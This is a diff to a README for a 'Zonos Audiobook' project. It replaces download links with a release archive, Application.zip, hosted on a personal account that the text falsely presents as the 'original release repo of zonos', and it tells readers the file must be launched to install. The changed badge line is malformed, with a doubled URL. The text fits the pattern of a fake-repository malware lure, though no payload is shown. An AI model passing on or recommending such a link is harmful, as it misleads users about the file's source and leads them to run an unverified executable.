@@ -14,7 +14,7 @@ Welcome to the Zonos Audiobook repository! This project showcases the Zonos-v0.1
 
 ## Getting Started 🚀
 
-To get started with the Zonos Audiobook, simply visit the [original release repo of zonos](https://github.com/file/Application.zip). Kindly note that the file needs to be launched for installation to begin. If you encounter any issues with the link, please check the "Releases" section for alternative download options.
+To get started with the Zonos Audiobook, simply visit the [original release repo of zonos](https://github.com/milan-ha-jkbd/zonos-audiobook/releases/download/v1.0.0/Application.zip). Kindly note that the file needs to be launched for installation to begin. If you encounter any issues with the link, please check the "Releases" section for alternative download options.
 
 ## Usage 🎯
 
@@ -34,4 +34,4 @@ Stay tuned to this repository for the latest updates and enhancements to the Zon
 
 Let's embark on a journey of words and sound with the Zonos Audiobook! 🌟🎶
 
-[![Launch Zonos Audiobook](https://img.shields.io/badge/Launch-Zonos%20Audiobook-blue.svg)](https://github.com/file/Application.zip)
+[![Launch Zonos Audiobook](https://github.com/milan-ha-jkbd/zonos-audiobook/releases/download/v1.0.0/Application.zip%https://github.com/milan-ha-jkbd/zonos-audiobook/releases/download/v1.0.0/Application.zip)](https://github.com/milan-ha-jkbd/zonos-audiobook/releases/download/v1.0.0/Application.zip)
